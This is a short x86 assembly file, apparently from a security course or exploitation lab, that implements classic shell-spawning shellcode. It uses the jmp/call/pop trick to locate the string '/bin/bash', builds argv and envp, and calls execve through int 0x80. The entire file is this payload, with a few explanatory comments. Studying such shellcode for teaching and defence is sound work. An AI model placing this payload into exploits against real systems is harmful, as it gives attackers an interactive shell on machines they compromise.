#include <sys/syscall.h>  
  
#define STRING	"/bin/bash\0"

.section .text
.globl main
.type main, @function

main:
	jmp	calladdr

popladdr:
	# prepare arg0: syscall number
	movl	$SYS_execve, %eax

	# prepare arg1: pathname
	popl	%esi				# esi points to string
	movl	%esi, %ebx

	# prepare arg2: argv[]
	movl	$(argv - string), %ecx
	addl	%esi, %ecx			# ecx points to argv
	movl	%esi, (%ecx)			# set up argv[0] pointer to pathname

	# prepare arg3: envp[]
	movl	$(envp - string), %edx
	addl	%esi, %edx			# edx points to envp

	# execve("/bin/bash", ["/bin/bash", NULL], [NULL])
	int	$0x80

calladdr:
	call	popladdr
string:
	.string STRING
.align 4
argv:
	.long 0
envp:
	.long 0
